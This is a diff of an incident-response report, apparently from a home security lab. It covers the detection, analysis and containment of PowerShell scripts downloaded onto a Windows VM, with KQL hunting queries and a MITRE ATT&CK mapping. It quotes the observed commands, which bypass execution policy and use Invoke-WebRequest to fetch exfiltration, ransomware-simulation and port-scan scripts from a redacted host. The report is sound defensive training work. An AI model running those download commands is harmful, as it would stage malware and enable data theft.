@@ -29,6 +29,16 @@ Analytics Rule Configuration:
 - Group all alerts into one incident per 24 hours: Enabled
 - Stop query after alert: Enabled
 
+📍 Initial KQL Query
+
+let TargetDevice = "windows-target-1";
+DeviceProcessEvents
+| where DeviceName == TargetDevice
+| where FileName == "powershell.exe"
+| where InitiatingProcessCommandLine contains "Invoke-webrequest"
+
+
+
 📍 Alert Rule KQL Query
 
 let TargetHostname = "windows-target-1";
@@ -38,71 +48,134 @@ DeviceProcessEvents
 | where InitiatingProcessCommandLine contains "Invoke-WebRequest"
 | order by TimeGenerated
 
+📝 Observed PowerShell Commands (Line by Line):
 
+powershell.exe -ExecutionPolicy Bypass -Command \
+    Invoke-WebRequest -Uri 'https://.../exfiltratedata.ps1' \
+    -OutFile 'C:\programdata\exfiltratedata.ps1'
 
-📝 Observed PowerShell Commands:
+powershell.exe -ExecutionPolicy Bypass -Command \
+    Invoke-WebRequest -Uri 'https://.../eicar.ps1' \
+    -OutFile 'C:\programdata\eicar.ps1'
 
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../eicar.ps1' -OutFile 'C:\programdata\eicar.ps1'
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1'
-powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1'
+powershell.exe -ExecutionPolicy Bypass -Command \
+    Invoke-WebRequest -Uri 'https://.../pwncrypt.ps1' \
+    -OutFile 'C:\programdata\pwncrypt.ps1'
 
-
+powershell.exe -ExecutionPolicy Bypass -Command \
+    Invoke-WebRequest -Uri 'https://.../portscan.ps1' \
+    -OutFile 'C:\programdata\portscan.ps1'
 
 🧑 User Statement:
 User stated they tried to install a free utility tool and a black screen appeared briefly, then nothing happened.
 
-
-
 ✅ Confirm Script Execution - KQL Query
 
 let TargetHostname = "windows-target-1";
-let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
+let ScriptNames = dynamic([
+"eicar.ps1",
+"exfiltratedata.ps1",
+"portscan.ps1",
+"pwncrypt.ps1"
+]);
+
 DeviceProcessEvents
 | where DeviceName == TargetHostname
 | where FileName == "powershell.exe"
-| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
+| where ProcessCommandLine contains "-File"
+| where ProcessCommandLine has_any (ScriptNames)
 | order by TimeGenerated
 | project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
 
-🔬 Script Analysis Summary:
-- exfiltratedata.ps1 → Attempts to send files to an external destination.
-- eicar.ps1 → EICAR test script used to trigger antivirus detection.
-- pwncrypt.ps1 → Encrypts files (simulated ransomware behavior).
-- portscan.ps1 → Scans local and network ports (reconnaissance).
 
-## 🛠️ Step 3: Containment, Eradication, and Recovery
+
+🔬 Script Analysis Summary:
+
+exfiltratedata.ps1 → Attempts to send files to an external destination.
+
+eicar.ps1 → EICAR test script used to trigger antivirus detection.
+
+pwncrypt.ps1 → Encrypts files (simulated ransomware behavior).
+
+portscan.ps1 → Scans local and network ports (reconnaissance).
+
+
+
+🛠️ Step 3: Containment, Eradication, and Recovery
 
 Containment Actions:
-- Isolated the affected VM using Microsoft Defender for Endpoint.
-- Ran a full anti-malware scan.
-- Verified no persistence mechanisms or lateral movement.
-- Removed machine from isolation and restored to operational status.
+
+Isolated the affected VM using Microsoft Defender for Endpoint.
+
+Ran a full anti-malware scan.
+
+Verified no persistence mechanisms or lateral movement.
+
+Removed machine from isolation and restored to operational status.
 
 Execution Findings:
-- exfiltratedata.ps1 and portscan.ps1 were executed by local user account.
-- exfiltratedata.ps1 attempted data transfer.
-- portscan.ps1 performed local port scanning.
 
-## 📘 Step 4: Post-Incident Activities
+exfiltratedata.ps1 and portscan.ps1 were executed by local user account.
+
+exfiltratedata.ps1 attempted data transfer.
+
+portscan.ps1 performed local port scanning.
+
+
+
+📘 Step 4: Post-Incident Activities
 
 Lessons Learned:
-- Affected user enrolled in enhanced cybersecurity awareness training.
-- KnowBe4 awareness campaign frequency increased.
-- PowerShell restricted to admin accounts only.
-- Sentinel detection logic updated for better script activity detection.
+
+Affected user enrolled in enhanced cybersecurity awareness training.
+
+KnowBe4 awareness campaign frequency increased.
+
+PowerShell restricted to admin accounts only.
+
+Sentinel detection logic updated for better script activity detection.
 
 Closure:
-- Incident marked as "True Positive".
-- Case notes and timeline finalized.
-- Incident closed successfully in Sentinel.
 
-## 🧩 MITRE ATT&CK Mapping
+Incident marked as "True Positive".
 
-| Technique ID  | Name                                 | Description                                        |
-|---------------|--------------------------------------|----------------------------------------------------|
-| T1059.001     | PowerShell                           | Abuse of PowerShell to execute downloaded scripts  |
-| T1105         | Ingress Tool Transfer                | Remote tools/scripts downloaded to endpoint        |
-| T1071.001     | Application Layer Protocol: Web      | HTTP/HTTPS used for C2 and data transfer           |
-| T1562.001     | Impair Defenses: ExecutionPolicy Bypass | Disable script protections via policy bypass   |
+Case notes and timeline finalized.
+
+Incident closed successfully in Sentinel.
+
+
+
+🧩 MITRE ATT&CK Mapping
+
+Technique ID
+
+Name
+
+Description
+
+T1059.001
+
+PowerShell
+
+Abuse of PowerShell to execute downloaded scripts
+
+T1105
+
+Ingress Tool Transfer
+
+Remote tools/scripts downloaded to endpoint
+
+T1071.001
+
+Application Layer Protocol: Web
+
+HTTP/HTTPS used for C2 and data transfer
+
+T1562.001
+
+Impair Defenses: ExecutionPolicy Bypass
+
+Disable script protections via policy bypass
+
+
 
